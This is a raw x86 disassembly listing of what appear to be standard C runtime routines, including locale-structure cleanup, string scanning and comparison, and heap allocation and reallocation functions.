  4081cc:	ff b6 a4 00 00 00    	push   0xa4(%esi)
  4081d2:	e8 14 c6 ff ff       	call   0x4047eb
  4081d7:	ff b6 a8 00 00 00    	push   0xa8(%esi)
  4081dd:	e8 09 c6 ff ff       	call   0x4047eb
  4081e2:	83 c4 2c             	add    $0x2c,%esp
  4081e5:	5e                   	pop    %esi
  4081e6:	5d                   	pop    %ebp
  4081e7:	c3                   	ret
  4081e8:	8b ff                	mov    %edi,%edi
  4081ea:	55                   	push   %ebp
  4081eb:	8b ec                	mov    %esp,%ebp
  4081ed:	56                   	push   %esi
  4081ee:	8b 75 08             	mov    0x8(%ebp),%esi
  4081f1:	85 f6                	test   %esi,%esi
  4081f3:	74 35                	je     0x40822a
  4081f5:	8b 06                	mov    (%esi),%eax
  4081f7:	3b 05 68 dd 40 00    	cmp    0x40dd68,%eax
  4081fd:	74 07                	je     0x408206
  4081ff:	50                   	push   %eax
  408200:	e8 e6 c5 ff ff       	call   0x4047eb
  408205:	59                   	pop    %ecx
  408206:	8b 46 04             	mov    0x4(%esi),%eax
  408209:	3b 05 6c dd 40 00    	cmp    0x40dd6c,%eax
  40820f:	74 07                	je     0x408218
  408211:	50                   	push   %eax
  408212:	e8 d4 c5 ff ff       	call   0x4047eb
  408217:	59                   	pop    %ecx
  408218:	8b 76 08             	mov    0x8(%esi),%esi
  40821b:	3b 35 70 dd 40 00    	cmp    0x40dd70,%esi
  408221:	74 07                	je     0x40822a
  408223:	56                   	push   %esi
  408224:	e8 c2 c5 ff ff       	call   0x4047eb
  408229:	59                   	pop    %ecx
  40822a:	5e                   	pop    %esi
  40822b:	5d                   	pop    %ebp
  40822c:	c3                   	ret
  40822d:	8b ff                	mov    %edi,%edi
  40822f:	55                   	push   %ebp
  408230:	8b ec                	mov    %esp,%ebp
  408232:	56                   	push   %esi
  408233:	8b 75 08             	mov    0x8(%ebp),%esi
  408236:	85 f6                	test   %esi,%esi
  408238:	74 7e                	je     0x4082b8
  40823a:	8b 46 0c             	mov    0xc(%esi),%eax
  40823d:	3b 05 74 dd 40 00    	cmp    0x40dd74,%eax
  408243:	74 07                	je     0x40824c
  408245:	50                   	push   %eax
  408246:	e8 a0 c5 ff ff       	call   0x4047eb
  40824b:	59                   	pop    %ecx
  40824c:	8b 46 10             	mov    0x10(%esi),%eax
  40824f:	3b 05 78 dd 40 00    	cmp    0x40dd78,%eax
  408255:	74 07                	je     0x40825e
  408257:	50                   	push   %eax
  408258:	e8 8e c5 ff ff       	call   0x4047eb
  40825d:	59                   	pop    %ecx
  40825e:	8b 46 14             	mov    0x14(%esi),%eax
  408261:	3b 05 7c dd 40 00    	cmp    0x40dd7c,%eax
  408267:	74 07                	je     0x408270
  408269:	50                   	push   %eax
  40826a:	e8 7c c5 ff ff       	call   0x4047eb
  40826f:	59                   	pop    %ecx
  408270:	8b 46 18             	mov    0x18(%esi),%eax
  408273:	3b 05 80 dd 40 00    	cmp    0x40dd80,%eax
  408279:	74 07                	je     0x408282
  40827b:	50                   	push   %eax
  40827c:	e8 6a c5 ff ff       	call   0x4047eb
  408281:	59                   	pop    %ecx
  408282:	8b 46 1c             	mov    0x1c(%esi),%eax
  408285:	3b 05 84 dd 40 00    	cmp    0x40dd84,%eax
  40828b:	74 07                	je     0x408294
  40828d:	50                   	push   %eax
  40828e:	e8 58 c5 ff ff       	call   0x4047eb
  408293:	59                   	pop    %ecx
  408294:	8b 46 20             	mov    0x20(%esi),%eax
  408297:	3b 05 88 dd 40 00    	cmp    0x40dd88,%eax
  40829d:	74 07                	je     0x4082a6
  40829f:	50                   	push   %eax
  4082a0:	e8 46 c5 ff ff       	call   0x4047eb
  4082a5:	59                   	pop    %ecx
  4082a6:	8b 76 24             	mov    0x24(%esi),%esi
  4082a9:	3b 35 8c dd 40 00    	cmp    0x40dd8c,%esi
  4082af:	74 07                	je     0x4082b8
  4082b1:	56                   	push   %esi
  4082b2:	e8 34 c5 ff ff       	call   0x4047eb
  4082b7:	59                   	pop    %ecx
  4082b8:	5e                   	pop    %esi
  4082b9:	5d                   	pop    %ebp
  4082ba:	c3                   	ret
  4082bb:	cc                   	int3
  4082bc:	cc                   	int3
  4082bd:	cc                   	int3
  4082be:	cc                   	int3
  4082bf:	cc                   	int3
  4082c0:	55                   	push   %ebp
  4082c1:	8b ec                	mov    %esp,%ebp
  4082c3:	56                   	push   %esi
  4082c4:	33 c0                	xor    %eax,%eax
  4082c6:	50                   	push   %eax
  4082c7:	50                   	push   %eax
  4082c8:	50                   	push   %eax
  4082c9:	50                   	push   %eax
  4082ca:	50                   	push   %eax
  4082cb:	50                   	push   %eax
  4082cc:	50                   	push   %eax
  4082cd:	50                   	push   %eax
  4082ce:	8b 55 0c             	mov    0xc(%ebp),%edx
  4082d1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4082d4:	8a 02                	mov    (%edx),%al
  4082d6:	0a c0                	or     %al,%al
  4082d8:	74 09                	je     0x4082e3
  4082da:	83 c2 01             	add    $0x1,%edx
  4082dd:	0f ab 04 24          	bts    %eax,(%esp)
  4082e1:	eb f1                	jmp    0x4082d4
  4082e3:	8b 75 08             	mov    0x8(%ebp),%esi
  4082e6:	83 c9 ff             	or     $0xffffffff,%ecx
  4082e9:	8d 49 00             	lea    0x0(%ecx),%ecx
  4082ec:	83 c1 01             	add    $0x1,%ecx
  4082ef:	8a 06                	mov    (%esi),%al
  4082f1:	0a c0                	or     %al,%al
  4082f3:	74 09                	je     0x4082fe
  4082f5:	83 c6 01             	add    $0x1,%esi
  4082f8:	0f a3 04 24          	bt     %eax,(%esp)
  4082fc:	73 ee                	jae    0x4082ec
  4082fe:	8b c1                	mov    %ecx,%eax
  408300:	83 c4 20             	add    $0x20,%esp
  408303:	5e                   	pop    %esi
  408304:	c9                   	leave
  408305:	c3                   	ret
  408306:	cc                   	int3
  408307:	cc                   	int3
  408308:	cc                   	int3
  408309:	cc                   	int3
  40830a:	cc                   	int3
  40830b:	cc                   	int3
  40830c:	cc                   	int3
  40830d:	cc                   	int3
  40830e:	cc                   	int3
  40830f:	cc                   	int3
  408310:	8b 54 24 04          	mov    0x4(%esp),%edx
  408314:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  408318:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40831e:	75 3c                	jne    0x40835c
  408320:	8b 02                	mov    (%edx),%eax
  408322:	3a 01                	cmp    (%ecx),%al
  408324:	75 2e                	jne    0x408354
  408326:	0a c0                	or     %al,%al
  408328:	74 26                	je     0x408350
  40832a:	3a 61 01             	cmp    0x1(%ecx),%ah
  40832d:	75 25                	jne    0x408354
  40832f:	0a e4                	or     %ah,%ah
  408331:	74 1d                	je     0x408350
  408333:	c1 e8 10             	shr    $0x10,%eax
  408336:	3a 41 02             	cmp    0x2(%ecx),%al
  408339:	75 19                	jne    0x408354
  40833b:	0a c0                	or     %al,%al
  40833d:	74 11                	je     0x408350
  40833f:	3a 61 03             	cmp    0x3(%ecx),%ah
  408342:	75 10                	jne    0x408354
  408344:	83 c1 04             	add    $0x4,%ecx
  408347:	83 c2 04             	add    $0x4,%edx
  40834a:	0a e4                	or     %ah,%ah
  40834c:	75 d2                	jne    0x408320
  40834e:	8b ff                	mov    %edi,%edi
  408350:	33 c0                	xor    %eax,%eax
  408352:	c3                   	ret
  408353:	90                   	nop
  408354:	1b c0                	sbb    %eax,%eax
  408356:	d1 e0                	shl    $1,%eax
  408358:	83 c0 01             	add    $0x1,%eax
  40835b:	c3                   	ret
  40835c:	f7 c2 01 00 00 00    	test   $0x1,%edx
  408362:	74 18                	je     0x40837c
  408364:	8a 02                	mov    (%edx),%al
  408366:	83 c2 01             	add    $0x1,%edx
  408369:	3a 01                	cmp    (%ecx),%al
  40836b:	75 e7                	jne    0x408354
  40836d:	83 c1 01             	add    $0x1,%ecx
  408370:	0a c0                	or     %al,%al
  408372:	74 dc                	je     0x408350
  408374:	f7 c2 02 00 00 00    	test   $0x2,%edx
  40837a:	74 a4                	je     0x408320
  40837c:	66 8b 02             	mov    (%edx),%ax
  40837f:	83 c2 02             	add    $0x2,%edx
  408382:	3a 01                	cmp    (%ecx),%al
  408384:	75 ce                	jne    0x408354
  408386:	0a c0                	or     %al,%al
  408388:	74 c6                	je     0x408350
  40838a:	3a 61 01             	cmp    0x1(%ecx),%ah
  40838d:	75 c5                	jne    0x408354
  40838f:	0a e4                	or     %ah,%ah
  408391:	74 bd                	je     0x408350
  408393:	83 c1 02             	add    $0x2,%ecx
  408396:	eb 88                	jmp    0x408320
  408398:	cc                   	int3
  408399:	cc                   	int3
  40839a:	cc                   	int3
  40839b:	cc                   	int3
  40839c:	cc                   	int3
  40839d:	cc                   	int3
  40839e:	cc                   	int3
  40839f:	cc                   	int3
  4083a0:	55                   	push   %ebp
  4083a1:	8b ec                	mov    %esp,%ebp
  4083a3:	56                   	push   %esi
  4083a4:	33 c0                	xor    %eax,%eax
  4083a6:	50                   	push   %eax
  4083a7:	50                   	push   %eax
  4083a8:	50                   	push   %eax
  4083a9:	50                   	push   %eax
  4083aa:	50                   	push   %eax
  4083ab:	50                   	push   %eax
  4083ac:	50                   	push   %eax
  4083ad:	50                   	push   %eax
  4083ae:	8b 55 0c             	mov    0xc(%ebp),%edx
  4083b1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4083b4:	8a 02                	mov    (%edx),%al
  4083b6:	0a c0                	or     %al,%al
  4083b8:	74 09                	je     0x4083c3
  4083ba:	83 c2 01             	add    $0x1,%edx
  4083bd:	0f ab 04 24          	bts    %eax,(%esp)
  4083c1:	eb f1                	jmp    0x4083b4
  4083c3:	8b 75 08             	mov    0x8(%ebp),%esi
  4083c6:	8b ff                	mov    %edi,%edi
  4083c8:	8a 06                	mov    (%esi),%al
  4083ca:	0a c0                	or     %al,%al
  4083cc:	74 0c                	je     0x4083da
  4083ce:	83 c6 01             	add    $0x1,%esi
  4083d1:	0f a3 04 24          	bt     %eax,(%esp)
  4083d5:	73 f1                	jae    0x4083c8
  4083d7:	8d 46 ff             	lea    -0x1(%esi),%eax
  4083da:	83 c4 20             	add    $0x20,%esp
  4083dd:	5e                   	pop    %esi
  4083de:	c9                   	leave
  4083df:	c3                   	ret
  4083e0:	6a 02                	push   $0x2
  4083e2:	e8 b5 97 ff ff       	call   0x401b9c
  4083e7:	59                   	pop    %ecx
  4083e8:	c3                   	ret
  4083e9:	6a 0c                	push   $0xc
  4083eb:	68 10 b8 40 00       	push   $0x40b810
  4083f0:	e8 2b ab ff ff       	call   0x402f20
  4083f5:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  4083f9:	8b 75 08             	mov    0x8(%ebp),%esi
  4083fc:	3b 35 6c e9 40 00    	cmp    0x40e96c,%esi
  408402:	77 22                	ja     0x408426
  408404:	6a 04                	push   $0x4
  408406:	e8 4b d7 ff ff       	call   0x405b56
  40840b:	59                   	pop    %ecx
  40840c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408410:	56                   	push   %esi
  408411:	e8 e1 eb ff ff       	call   0x406ff7
  408416:	59                   	pop    %ecx
  408417:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40841a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  408421:	e8 09 00 00 00       	call   0x40842f
  408426:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408429:	e8 37 ab ff ff       	call   0x402f65
  40842e:	c3                   	ret
  40842f:	6a 04                	push   $0x4
  408431:	e8 46 d6 ff ff       	call   0x405a7c
  408436:	59                   	pop    %ecx
  408437:	c3                   	ret
  408438:	8b ff                	mov    %edi,%edi
  40843a:	55                   	push   %ebp
  40843b:	8b ec                	mov    %esp,%ebp
  40843d:	56                   	push   %esi
  40843e:	8b 75 08             	mov    0x8(%ebp),%esi
  408441:	83 fe e0             	cmp    $0xffffffe0,%esi
  408444:	0f 87 a1 00 00 00    	ja     0x4084eb
  40844a:	53                   	push   %ebx
  40844b:	57                   	push   %edi
  40844c:	8b 3d 04 a1 40 00    	mov    0x40a104,%edi
  408452:	83 3d 7c e3 40 00 00 	cmpl   $0x0,0x40e37c
  408459:	75 18                	jne    0x408473
  40845b:	e8 ef 9b ff ff       	call   0x40204f
  408460:	6a 1e                	push   $0x1e
  408462:	e8 3d 9a ff ff       	call   0x401ea4
  408467:	68 ff 00 00 00       	push   $0xff
  40846c:	e8 7f 97 ff ff       	call   0x401bf0
  408471:	59                   	pop    %ecx
  408472:	59                   	pop    %ecx
  408473:	a1 a8 f9 40 00       	mov    0x40f9a8,%eax
  408478:	83 f8 01             	cmp    $0x1,%eax
  40847b:	75 0e                	jne    0x40848b
  40847d:	85 f6                	test   %esi,%esi
  40847f:	74 04                	je     0x408485
  408481:	8b c6                	mov    %esi,%eax
  408483:	eb 03                	jmp    0x408488
  408485:	33 c0                	xor    %eax,%eax
  408487:	40                   	inc    %eax
  408488:	50                   	push   %eax
  408489:	eb 1c                	jmp    0x4084a7
  40848b:	83 f8 03             	cmp    $0x3,%eax
  40848e:	75 0b                	jne    0x40849b
  408490:	56                   	push   %esi
  408491:	e8 53 ff ff ff       	call   0x4083e9
  408496:	59                   	pop    %ecx
  408497:	85 c0                	test   %eax,%eax
  408499:	75 16                	jne    0x4084b1
  40849b:	85 f6                	test   %esi,%esi
  40849d:	75 01                	jne    0x4084a0
  40849f:	46                   	inc    %esi
  4084a0:	83 c6 0f             	add    $0xf,%esi
  4084a3:	83 e6 f0             	and    $0xfffffff0,%esi
  4084a6:	56                   	push   %esi
  4084a7:	6a 00                	push   $0x0
  4084a9:	ff 35 7c e3 40 00    	push   0x40e37c
  4084af:	ff d7                	call   *%edi
  4084b1:	8b d8                	mov    %eax,%ebx
  4084b3:	85 db                	test   %ebx,%ebx
  4084b5:	75 2e                	jne    0x4084e5
  4084b7:	6a 0c                	push   $0xc
  4084b9:	5e                   	pop    %esi
  4084ba:	39 05 58 e9 40 00    	cmp    %eax,0x40e958
  4084c0:	74 15                	je     0x4084d7
  4084c2:	ff 75 08             	push   0x8(%ebp)
  4084c5:	e8 01 dc ff ff       	call   0x4060cb
  4084ca:	59                   	pop    %ecx
  4084cb:	85 c0                	test   %eax,%eax
  4084cd:	74 0f                	je     0x4084de
  4084cf:	8b 75 08             	mov    0x8(%ebp),%esi
  4084d2:	e9 7b ff ff ff       	jmp    0x408452
  4084d7:	e8 a3 94 ff ff       	call   0x40197f
  4084dc:	89 30                	mov    %esi,(%eax)
  4084de:	e8 9c 94 ff ff       	call   0x40197f
  4084e3:	89 30                	mov    %esi,(%eax)
  4084e5:	5f                   	pop    %edi
  4084e6:	8b c3                	mov    %ebx,%eax
  4084e8:	5b                   	pop    %ebx
  4084e9:	eb 14                	jmp    0x4084ff
  4084eb:	56                   	push   %esi
  4084ec:	e8 da db ff ff       	call   0x4060cb
  4084f1:	59                   	pop    %ecx
  4084f2:	e8 88 94 ff ff       	call   0x40197f
  4084f7:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  4084fd:	33 c0                	xor    %eax,%eax
  4084ff:	5e                   	pop    %esi
  408500:	5d                   	pop    %ebp
  408501:	c3                   	ret
  408502:	6a 0c                	push   $0xc
  408504:	68 30 b8 40 00       	push   $0x40b830
  408509:	e8 12 aa ff ff       	call   0x402f20
  40850e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408511:	33 ff                	xor    %edi,%edi
  408513:	3b cf                	cmp    %edi,%ecx
  408515:	76 2e                	jbe    0x408545
  408517:	6a e0                	push   $0xffffffe0
  408519:	58                   	pop    %eax
  40851a:	33 d2                	xor    %edx,%edx
  40851c:	f7 f1                	div    %ecx
  40851e:	3b 45 0c             	cmp    0xc(%ebp),%eax
  408521:	1b c0                	sbb    %eax,%eax
  408523:	40                   	inc    %eax
  408524:	75 1f                	jne    0x408545
  408526:	e8 54 94 ff ff       	call   0x40197f
  40852b:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  408531:	57                   	push   %edi
  408532:	57                   	push   %edi
  408533:	57                   	push   %edi
  408534:	57                   	push   %edi
  408535:	57                   	push   %edi
  408536:	e8 dc 93 ff ff       	call   0x401917
  40853b:	83 c4 14             	add    $0x14,%esp
  40853e:	33 c0                	xor    %eax,%eax
  408540:	e9 d5 00 00 00       	jmp    0x40861a
  408545:	0f af 4d 0c          	imul   0xc(%ebp),%ecx
  408549:	8b f1                	mov    %ecx,%esi
  40854b:	89 75 08             	mov    %esi,0x8(%ebp)
  40854e:	3b f7                	cmp    %edi,%esi
  408550:	75 03                	jne    0x408555
  408552:	33 f6                	xor    %esi,%esi
  408554:	46                   	inc    %esi
  408555:	33 db                	xor    %ebx,%ebx
  408557:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  40855a:	83 fe e0             	cmp    $0xffffffe0,%esi
  40855d:	77 69                	ja     0x4085c8
  40855f:	83 3d a8 f9 40 00 03 	cmpl   $0x3,0x40f9a8
  408566:	75 4b                	jne    0x4085b3
  408568:	83 c6 0f             	add    $0xf,%esi
  40856b:	83 e6 f0             	and    $0xfffffff0,%esi
  40856e:	89 75 0c             	mov    %esi,0xc(%ebp)
  408571:	8b 45 08             	mov    0x8(%ebp),%eax
  408574:	3b 05 6c e9 40 00    	cmp    0x40e96c,%eax
  40857a:	77 37                	ja     0x4085b3
  40857c:	6a 04                	push   $0x4
  40857e:	e8 d3 d5 ff ff       	call   0x405b56
  408583:	59                   	pop    %ecx
  408584:	89 7d fc             	mov    %edi,-0x4(%ebp)
  408587:	ff 75 08             	push   0x8(%ebp)
  40858a:	e8 68 ea ff ff       	call   0x406ff7
  40858f:	59                   	pop    %ecx
  408590:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  408593:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40859a:	e8 5f 00 00 00       	call   0x4085fe
  40859f:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  4085a2:	3b df                	cmp    %edi,%ebx
  4085a4:	74 11                	je     0x4085b7
  4085a6:	ff 75 08             	push   0x8(%ebp)
  4085a9:	57                   	push   %edi
  4085aa:	53                   	push   %ebx
  4085ab:	e8 f0 c6 ff ff       	call   0x404ca0
  4085b0:	83 c4 0c             	add    $0xc,%esp
  4085b3:	3b df                	cmp    %edi,%ebx
  4085b5:	75 61                	jne    0x408618
  4085b7:	56                   	push   %esi
  4085b8:	6a 08                	push   $0x8
  4085ba:	ff 35 7c e3 40 00    	push   0x40e37c
  4085c0:	ff 15 04 a1 40 00    	call   *0x40a104
  4085c6:	8b d8                	mov    %eax,%ebx
  4085c8:	3b df                	cmp    %edi,%ebx
  4085ca:	75 4c                	jne    0x408618
  4085cc:	39 3d 58 e9 40 00    	cmp    %edi,0x40e958
  4085d2:	74 33                	je     0x408607
  4085d4:	56                   	push   %esi
  4085d5:	e8 f1 da ff ff       	call   0x4060cb
  4085da:	59                   	pop    %ecx
  4085db:	85 c0                	test   %eax,%eax
  4085dd:	0f 85 72 ff ff ff    	jne    0x408555
  4085e3:	8b 45 10             	mov    0x10(%ebp),%eax
  4085e6:	3b c7                	cmp    %edi,%eax
  4085e8:	0f 84 50 ff ff ff    	je     0x40853e
  4085ee:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  4085f4:	e9 45 ff ff ff       	jmp    0x40853e
  4085f9:	33 ff                	xor    %edi,%edi
  4085fb:	8b 75 0c             	mov    0xc(%ebp),%esi
  4085fe:	6a 04                	push   $0x4
  408600:	e8 77 d4 ff ff       	call   0x405a7c
  408605:	59                   	pop    %ecx
  408606:	c3                   	ret
  408607:	3b df                	cmp    %edi,%ebx
  408609:	75 0d                	jne    0x408618
  40860b:	8b 45 10             	mov    0x10(%ebp),%eax
  40860e:	3b c7                	cmp    %edi,%eax
  408610:	74 06                	je     0x408618
  408612:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  408618:	8b c3                	mov    %ebx,%eax
  40861a:	e8 46 a9 ff ff       	call   0x402f65
  40861f:	c3                   	ret
  408620:	6a 10                	push   $0x10
  408622:	68 50 b8 40 00       	push   $0x40b850
  408627:	e8 f4 a8 ff ff       	call   0x402f20
  40862c:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40862f:	85 db                	test   %ebx,%ebx
  408631:	75 0e                	jne    0x408641
  408633:	ff 75 0c             	push   0xc(%ebp)
  408636:	e8 fd fd ff ff       	call   0x408438
  40863b:	59                   	pop    %ecx
  40863c:	e9 cc 01 00 00       	jmp    0x40880d
  408641:	8b 75 0c             	mov    0xc(%ebp),%esi
  408644:	85 f6                	test   %esi,%esi
  408646:	75 0c                	jne    0x408654
  408648:	53                   	push   %ebx
  408649:	e8 9d c1 ff ff       	call   0x4047eb
  40864e:	59                   	pop    %ecx
  40864f:	e9 b7 01 00 00       	jmp    0x40880b
  408654:	83 3d a8 f9 40 00 03 	cmpl   $0x3,0x40f9a8
  40865b:	0f 85 93 01 00 00    	jne    0x4087f4
  408661:	33 ff                	xor    %edi,%edi
  408663:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  408666:	83 fe e0             	cmp    $0xffffffe0,%esi
  408669:	0f 87 8a 01 00 00    	ja     0x4087f9
  40866f:	6a 04                	push   $0x4
  408671:	e8 e0 d4 ff ff       	call   0x405b56
  408676:	59                   	pop    %ecx
  408677:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40867a:	53                   	push   %ebx
  40867b:	e8 95 e1 ff ff       	call   0x406815
  408680:	59                   	pop    %ecx
  408681:	89 45 e0             	mov    %eax,-0x20(%ebp)
  408684:	3b c7                	cmp    %edi,%eax
  408686:	0f 84 9e 00 00 00    	je     0x40872a
  40868c:	3b 35 6c e9 40 00    	cmp    0x40e96c,%esi
  408692:	77 49                	ja     0x4086dd
  408694:	56                   	push   %esi
  408695:	53                   	push   %ebx
  408696:	50                   	push   %eax
  408697:	e8 77 e6 ff ff       	call   0x406d13
  40869c:	83 c4 0c             	add    $0xc,%esp
  40869f:	85 c0                	test   %eax,%eax
  4086a1:	74 05                	je     0x4086a8
  4086a3:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4086a6:	eb 35                	jmp    0x4086dd
  4086a8:	56                   	push   %esi
  4086a9:	e8 49 e9 ff ff       	call   0x406ff7
  4086ae:	59                   	pop    %ecx
  4086af:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4086b2:	3b c7                	cmp    %edi,%eax
  4086b4:	74 27                	je     0x4086dd
  4086b6:	8b 43 fc             	mov    -0x4(%ebx),%eax
  4086b9:	48                   	dec    %eax
  4086ba:	3b c6                	cmp    %esi,%eax
  4086bc:	72 02                	jb     0x4086c0
  4086be:	8b c6                	mov    %esi,%eax
  4086c0:	50                   	push   %eax
  4086c1:	53                   	push   %ebx
  4086c2:	ff 75 e4             	push   -0x1c(%ebp)
  4086c5:	e8 e6 dd ff ff       	call   0x4064b0
  4086ca:	53                   	push   %ebx
  4086cb:	e8 45 e1 ff ff       	call   0x406815
  4086d0:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4086d3:	53                   	push   %ebx
  4086d4:	50                   	push   %eax
  4086d5:	e8 6b e1 ff ff       	call   0x406845
  4086da:	83 c4 18             	add    $0x18,%esp
  4086dd:	39 7d e4             	cmp    %edi,-0x1c(%ebp)
  4086e0:	75 48                	jne    0x40872a
  4086e2:	3b f7                	cmp    %edi,%esi
  4086e4:	75 06                	jne    0x4086ec
  4086e6:	33 f6                	xor    %esi,%esi
  4086e8:	46                   	inc    %esi
  4086e9:	89 75 0c             	mov    %esi,0xc(%ebp)
  4086ec:	83 c6 0f             	add    $0xf,%esi
  4086ef:	83 e6 f0             	and    $0xfffffff0,%esi
  4086f2:	89 75 0c             	mov    %esi,0xc(%ebp)
  4086f5:	56                   	push   %esi
  4086f6:	57                   	push   %edi
  4086f7:	ff 35 7c e3 40 00    	push   0x40e37c
  4086fd:	ff 15 04 a1 40 00    	call   *0x40a104
  408703:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  408706:	3b c7                	cmp    %edi,%eax
  408708:	74 20                	je     0x40872a
  40870a:	8b 43 fc             	mov    -0x4(%ebx),%eax
  40870d:	48                   	dec    %eax
  40870e:	3b c6                	cmp    %esi,%eax
  408710:	72 02                	jb     0x408714
  408712:	8b c6                	mov    %esi,%eax
  408714:	50                   	push   %eax
  408715:	53                   	push   %ebx
  408716:	ff 75 e4             	push   -0x1c(%ebp)
  408719:	e8 92 dd ff ff       	call   0x4064b0
  40871e:	53                   	push   %ebx
  40871f:	ff 75 e0             	push   -0x20(%ebp)
  408722:	e8 1e e1 ff ff       	call   0x406845
  408727:	83 c4 14             	add    $0x14,%esp
  40872a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  408731:	e8 2e 00 00 00       	call   0x408764
  408736:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40873a:	75 31                	jne    0x40876d
  40873c:	85 f6                	test   %esi,%esi
  40873e:	75 01                	jne    0x408741
  408740:	46                   	inc    %esi
  408741:	83 c6 0f             	add    $0xf,%esi
  408744:	83 e6 f0             	and    $0xfffffff0,%esi
  408747:	89 75 0c             	mov    %esi,0xc(%ebp)
  40874a:	56                   	push   %esi
  40874b:	53                   	push   %ebx
  40874c:	6a 00                	push   $0x0
  40874e:	ff 35 7c e3 40 00    	push   0x40e37c
  408754:	ff 15 0c a1 40 00    	call   *0x40a10c
  40875a:	8b f8                	mov    %eax,%edi
  40875c:	eb 12                	jmp    0x408770
  40875e:	8b 75 0c             	mov    0xc(%ebp),%esi
  408761:	8b 5d 08             	mov    0x8(%ebp),%ebx
  408764:	6a 04                	push   $0x4
  408766:	e8 11 d3 ff ff       	call   0x405a7c
  40876b:	59                   	pop    %ecx
  40876c:	c3                   	ret
  40876d:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  408770:	85 ff                	test   %edi,%edi
  408772:	0f 85 bf 00 00 00    	jne    0x408837
  408778:	39 3d 58 e9 40 00    	cmp    %edi,0x40e958
  40877e:	74 2c                	je     0x4087ac
  408780:	56                   	push   %esi
  408781:	e8 45 d9 ff ff       	call   0x4060cb
  408786:	59                   	pop    %ecx
  408787:	85 c0                	test   %eax,%eax
  408789:	0f 85 d2 fe ff ff    	jne    0x408661
  40878f:	e8 eb 91 ff ff       	call   0x40197f
  408794:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  408797:	75 6c                	jne    0x408805
  408799:	8b f0                	mov    %eax,%esi
  40879b:	ff 15 8c a0 40 00    	call   *0x40a08c
  4087a1:	50                   	push   %eax
  4087a2:	e8 96 91 ff ff       	call   0x40193d
  4087a7:	59                   	pop    %ecx
  4087a8:	89 06                	mov    %eax,(%esi)
  4087aa:	eb 5f                	jmp    0x40880b
  4087ac:	85 ff                	test   %edi,%edi
  4087ae:	0f 85 83 00 00 00    	jne    0x408837
  4087b4:	e8 c6 91 ff ff       	call   0x40197f
  4087b9:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  4087bc:	74 68                	je     0x408826
  4087be:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  4087c4:	eb 71                	jmp    0x408837
  4087c6:	85 f6                	test   %esi,%esi
  4087c8:	75 01                	jne    0x4087cb
  4087ca:	46                   	inc    %esi
  4087cb:	56                   	push   %esi
  4087cc:	53                   	push   %ebx
  4087cd:	6a 00                	push   $0x0
  4087cf:	ff 35 7c e3 40 00    	push   0x40e37c
  4087d5:	ff 15 0c a1 40 00    	call   *0x40a10c
  4087db:	8b f8                	mov    %eax,%edi
  4087dd:	85 ff                	test   %edi,%edi
  4087df:	75 56                	jne    0x408837
  4087e1:	39 05 58 e9 40 00    	cmp    %eax,0x40e958
  4087e7:	74 34                	je     0x40881d
  4087e9:	56                   	push   %esi
  4087ea:	e8 dc d8 ff ff       	call   0x4060cb
  4087ef:	59                   	pop    %ecx
  4087f0:	85 c0                	test   %eax,%eax
  4087f2:	74 1f                	je     0x408813
  4087f4:	83 fe e0             	cmp    $0xffffffe0,%esi
  4087f7:	76 cd                	jbe    0x4087c6
  4087f9:	56                   	push   %esi
  4087fa:	e8 cc d8 ff ff       	call   0x4060cb
  4087ff:	59                   	pop    %ecx
  408800:	e8 7a 91 ff ff       	call   0x40197f
  408805:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  40880b:	33 c0                	xor    %eax,%eax
  40880d:	e8 53 a7 ff ff       	call   0x402f65
  408812:	c3                   	ret
  408813:	e8 67 91 ff ff       	call   0x40197f
  408818:	e9 7c ff ff ff       	jmp    0x408799
  40881d:	85 ff                	test   %edi,%edi
  40881f:	75 16                	jne    0x408837
  408821:	e8 59 91 ff ff       	call   0x40197f
  408826:	8b f0                	mov    %eax,%esi
  408828:	ff 15 8c a0 40 00    	call   *0x40a08c
  40882e:	50                   	push   %eax
  40882f:	e8 09 91 ff ff       	call   0x40193d
  408834:	89 06                	mov    %eax,(%esi)
  408836:	59                   	pop    %ecx
  408837:	8b c7                	mov    %edi,%eax
  408839:	eb d2                	jmp    0x40880d
  40883b:	8b ff                	mov    %edi,%edi
  40883d:	55                   	push   %ebp
  40883e:	8b ec                	mov    %esp,%ebp
  408840:	81 ec 28 03 00 00    	sub    $0x328,%esp
  408846:	a3 80 e6 40 00       	mov    %eax,0x40e680
  40884b:	89 0d 7c e6 40 00    	mov    %ecx,0x40e67c
  408851:	89 15 78 e6 40 00    	mov    %edx,0x40e678
  408857:	89 1d 74 e6 40 00    	mov    %ebx,0x40e674
  40885d:	89 35 70 e6 40 00    	mov    %esi,0x40e670
  408863:	89 3d 6c e6 40 00    	mov    %edi,0x40e66c
  408869:	66 8c 15 98 e6 40 00 	data16 mov %ss,0x40e698
  408870:	66 8c 0d 8c e6 40 00 	data16 mov %cs,0x40e68c
